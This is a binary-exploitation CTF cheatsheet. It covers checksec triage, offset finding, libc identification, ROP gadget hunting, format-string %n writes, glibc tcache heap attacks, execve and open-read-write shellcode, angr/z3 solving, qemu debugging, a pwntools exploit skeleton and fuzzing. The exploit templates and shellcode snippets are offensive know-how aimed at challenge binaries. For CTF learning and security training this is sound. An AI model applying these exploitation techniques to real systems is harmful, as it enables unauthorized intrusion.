# Binary Exploitation / PWN CTF Cheatsheet — Tooling Edition

*Built around your installed stack: pwntools, gdb+GEF/pwndbg/peda, ropper/ROPgadget,
checksec, one_gadget, angr, qemu-user, libc-database+patchelf, seccomp-tools.
Request-only: qemu-system full VM images (kernel pwn), pwndbg latest (git version,
newer features than package-manager version), AFL++/LibAFL (fuzzing for crash discovery).*

---

```bash
file ./chall                          # arch, static/dynamic, stripped?
checksec --file=./chall               # canary/NX/PIE/RELRO — decides your whole attack plan
ldd ./chall                           # which libc it links against (if dynamic)
```

**checksec output -> what it means for your exploit:**

| Protection | ON means | OFF/Partial means |
|---|---|---|
| Canary | Can't simply smash the return address, need a leak or a way around it | Straight stack overflow -> ret address control |
| NX | No shellcode on stack, need ROP | Can write+execute shellcode directly on stack |
| PIE | Need to leak a runtime address for any code cave/gadget targeting | Addresses in the binary are fixed, hardcode them |
| RELRO (Full) | GOT is read-only, can't overwrite entries | GOT overwrite is fair game |
| RELRO (Partial/None) | — | GOT overwrite easier still |

---

## 1. Finding the Bug

```bash
gdb -q ./chall
pwndbg> run < input.txt                # feed a test input
pwndbg> context                        # full state view (regs/stack/disasm/backtrace)
pwndbg> cyclic 200                     # generate a De Bruijn pattern (pwntools has this too)
pwndbg> cyclic -l <value_at_crash>     # find exact offset once it crashes
```

```bash
python3 -c "from pwn import *; print(cyclic(200))"     # generate pattern via pwntools directly
python3 -c "from pwn import *; print(cyclic_find(0x6161616161616161))"   # find offset from crash value
```

---

## 2. libc identification & patching

```bash
# libc-database - identify the exact libc version from leaked function addresses
./libc-database/find puts <leaked_addr_hex>
./libc-database/find printf <leaked_addr_hex> system <leaked_addr_hex>   # match multiple leaks at once
./libc-database/download <libc_id>                # pulls the matching libc.so.6 + symbols

# patchelf - force the binary to use a specific libc/interpreter locally (matches remote exactly)
patchelf --set-interpreter ./libc-database/db/<libc_id>/ld-linux-x86-64.so.2 ./chall
patchelf --replace-needed libc.so.6 ./libc-database/db/<libc_id>/libc.so.6 ./chall
# then run normally: ./chall   (now uses the target libc instead of your system's)
```

**one_gadget — find a single address in libc that gives a shell directly (no full ROP chain needed):**
```bash
one_gadget ./libc.so.6
# outputs addresses + constraints, e.g.:
#   0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
#   constraints: rsp+0x40 == NULL
# jump to (libc_base + offset) once constraints are satisfied -- often just need rsp/rbp cleared right
```

---

## 3. ROP / Gadget Hunting

```bash
ROPgadget --binary ./chall                          # dump all gadgets
ROPgadget --binary ./chall | grep 'pop rdi'          # find a specific gadget
ROPgadget --binary ./chall --only 'pop|ret'          # filter by instruction type
ROPgadget --binary ./libc.so.6 --string '/bin/sh'    # find the /bin/sh string in libc

ropper --file ./chall --search "pop rdi; ret"        # ropper's search syntax (semicolon-separated)
ropper --file ./chall --search "pop rdi"             # partial search
ropper --file ./libc.so.6 --search "/bin/sh"         # search for a string
```

**pwntools ROP() automates chain-building instead of hand-picking gadgets:**
```python
from pwn import *
elf = ELF('./chall')
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])       # leak puts@got via puts itself
rop.call(elf.symbols['main'])              # return to main to reuse the bug
payload = b'A' * OFFSET + rop.chain()
```

---

## 4. Format String Bugs

```bash
python3 -c "from pwn import *; print(fmtstr_payload(6, {0x404040: 0xdeadbeef}))"  # %n write payload builder
```

```
%p              -- leak a stack value as pointer (find your input's offset first)
%7$p            -- leak the 7th format-string argument specifically
%s              -- leak whatever a pointer arg points to (can crash if invalid)
%n / %hn / %hhn -- WRITE to the address given as an argument (full/half/byte write)
```
Send `AAAAAAAA|%1$p|%2$p|...` and look for `4141414141414141` in the output to find
which offset corresponds to your own controlled input — that offset is what you build
the `%n` write payload against.

---

## 5. Heap Exploitation (glibc tcache)

```bash
pwndbg> heap                    # chunk-by-chunk heap overview
pwndbg> bins                    # tcache/fastbin/unsorted bin state
pwndbg> tcache                  # tcache-specific view
pwndbg> chunk <addr>            # inspect one chunk's header/size/flags
pwndbg> vis_heap_chunks         # visual layout of the whole heap
```

**glibc >= 2.32 safe-linking (fd pointers in tcache are XOR-mangled):**
```
real_fd = mangled_fd XOR (chunk_addr >> 12)
```
Compute this manually (or with `heap_helper.py` from your Crypto/PWN toolkit repo) whenever
you need to forge a tcache fd pointer to redirect the next `malloc()`.

**Attack quick reference:**

| Primitive | What it does |
|---|---|
| Tcache poisoning | Overwrite freed chunk's fd via UAF/overflow -> next malloc returns forged address |
| Double-free (bypass tcache's same-chunk check) | Free chunk A, free chunk B, free chunk A again -> two allocations return the same memory |
| House of Force | Overwrite top chunk size -> huge malloc lands anywhere in memory |
| House of Orange | Overflow into top chunk -> triggers unsorted bin insertion -> `_IO_FILE` hijack |
| Use-after-free (no double-free needed) | Just keep using a pointer after `free()` -- classic UAF read/write |

---

## 6. Shellcode (when NX is off, or you have a controllable execution primitive)

```python
from pwn import *
context.arch = 'amd64'
shellcode = asm(shellcraft.sh())                    # execve('/bin/sh')
```

**seccomp-tools — check what syscalls are actually allowed before assuming execve works:**
```bash
seccomp-tools dump ./chall                          # shows the BPF filter's allowed syscalls
```
If `execve` is blocked (very common in modern pwn), build an **open-read-write (ORW)**
shellcode instead:
```python
shellcode = asm(f'''
    {shellcraft.open("/flag.txt", 0, 0)}
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    {shellcraft.syscall('SYS_read')}
    mov rdx, rax
    mov rsi, rsp
    mov rdi, 1
    {shellcraft.syscall('SYS_write')}
''')
```

---

## 7. angr — Symbolic Execution

*Also available: `z3-solver` (angr uses it internally, but call it directly for custom
constraint puzzles that don't map cleanly to angr's find/avoid model) and
`angr-management` (GUI frontend — visualize the CFG and symbolic states instead of
reading simgr output blind, useful when explore() is taking a long time and you want
to see where it's actually stuck).*

Use when the "bug" is actually a puzzle (find the right input) rather than a classic
memory-corruption exploit — license-key checkers, embedded logic bombs, obfuscated
validation functions.

```python
import angr, claripy

proj = angr.Project('./chall', auto_load_libs=False)
flag_chars = [claripy.BVS(f'flag_{i}', 8) for i in range(20)]
flag = claripy.Concat(*flag_chars + [claripy.BVV(b'\n')])

state = proj.factory.full_init_state(
    stdin=angr.SimFileStream(name='stdin', content=flag, has_end=False)
)
for c in flag_chars:
    state.solver.add(c >= 0x20, c <= 0x7e)     # constrain to printable ASCII

simgr = proj.factory.simgr(state)
simgr.explore(find=0x401234, avoid=[0x401300])  # success addr vs failure addr

if simgr.found:
    print(simgr.found[0].solver.eval(flag, cast_to=bytes))
```
(see `angr_template.py` in your ReverseEngineering toolkit repo for a ready-to-fill version)

**Direct z3-solver use (bypass angr entirely for pure math/logic puzzles):**
```python
from z3 import *
x = BitVec('x', 32)
s = Solver()
s.add(x * 3 + 7 == 100)          # replace with the actual relation from the challenge
if s.check() == sat:
    print(s.model())
```
Reach for this instead of angr when the "check" isn't really symbolic execution over a
binary at all — e.g. the challenge gives you a system of equations, a hash-like
transform with known structure, or a PRNG state-recovery problem.

---

## 8. qemu-user — Foreign Architecture Binaries (ARM/MIPS pwn)

```bash
file ./chall                              # confirm arch first
qemu-arm -L /usr/arm-linux-gnueabi/ ./chall             # run an ARM32 binary on x86 host
qemu-mips -L /usr/mips-linux-gnu/ ./chall               # run a MIPS binary
qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./chall         # ARM64

# Debug a foreign-arch binary remotely with gdb
qemu-arm -g 1234 -L /usr/arm-linux-gnueabi/ ./chall     # starts and waits for gdb to attach
# in another terminal:
gdb-multiarch ./chall
(gdb) set architecture arm
(gdb) target remote localhost:1234
```

**qemu-system (request-only) — for kernel exploitation challenges (full VM, not just user-mode binary):**
```bash
qemu-system-x86_64 -kernel bzImage -initrd rootfs.cpio -append "console=ttyS0" -nographic -s -S
# -s = gdbserver on :1234, -S = pause at start
gdb vmlinux
(gdb) target remote localhost:1234
```
Only request this when the challenge is genuinely kernel-space (a provided `bzImage`/
`vmlinux` + `initrd`, not just a userspace binary) — regular pwn challenges don't need it.

---

## 9. pwntools exploit skeleton (local/remote switch)

```python
from pwn import *

context.log_level = 'info'
elf = context.binary = ELF('./chall')
libc = ELF('./libc.so.6') if os.path.exists('./libc.so.6') else None

io = process('./chall') if len(sys.argv) == 1 else remote('host', 1337)

# ... build payload ...
io.sendline(payload)
io.interactive()
```

---

## 10. Fuzzing (AFL++/LibAFL, request-only)

Use when you have local source or a binary you can run millions of times to find a
crash you haven't spotted by reading — less common in short CTF windows, more useful
for longer/harder pwn challenges or when static analysis genuinely isn't converging.

```bash
afl-gcc -o chall_fuzz chall.c              # instrument at compile time if source given
afl-fuzz -i input_dir -o output_dir -- ./chall_fuzz @@
afl-cmin -i output_dir/queue -o minimized_corpus -- ./chall_fuzz @@   # shrink corpus after a run

# QEMU mode when you ONLY have a binary, no source (no recompilation needed)
afl-fuzz -Q -i input_dir -o output_dir -- ./chall @@
```
Crashes land in `output_dir/crashes/` — feed those inputs back through gdb/pwndbg to
find exactly where and why it dies, then build the actual exploit from there.

---

## 11. Quick Reference — CTF Triage Checklist

**Fresh pwn binary, cold start:**
```
file + checksec → identify protections → ldd for libc version →
gdb/pwndbg: find the crash with cyclic pattern → cyclic_find for exact offset →
decide strategy based on checksec table above (shellcode vs ROP vs ret2libc)
```

**Canary present, need a leak first:**
```
Find a format string bug or an info-leak print → leak canary/libc/PIE base →
then proceed with ROP chain using the leaked addresses
```

**NX on, need ret2libc:**
```
Leak libc address (via puts@got or similar) → libc-database/find to identify exact libc →
patchelf to match locally → one_gadget for a quick shell, or build a proper
system("/bin/sh") ROP chain if one_gadget's constraints don't line up
```

**Heap challenge:**
```
pwndbg heap/bins/tcache to understand current state → identify UAF/double-free/overflow primitive →
check glibc version (safe-linking? tcache count limits?) → tcache poison or house-of-* accordingly
```

**Weird architecture (ARM/MIPS) binary:**
```
file to confirm arch → qemu-user + gdb-multiarch to run/debug locally →
same ROP/exploit logic as x86, just different calling convention/registers
```

**execve seems blocked / shellcode doesn't work:**
```
seccomp-tools dump to check the actual syscall filter → if execve blocked,
switch to ORW shellcode (open/read/write) instead
```

---
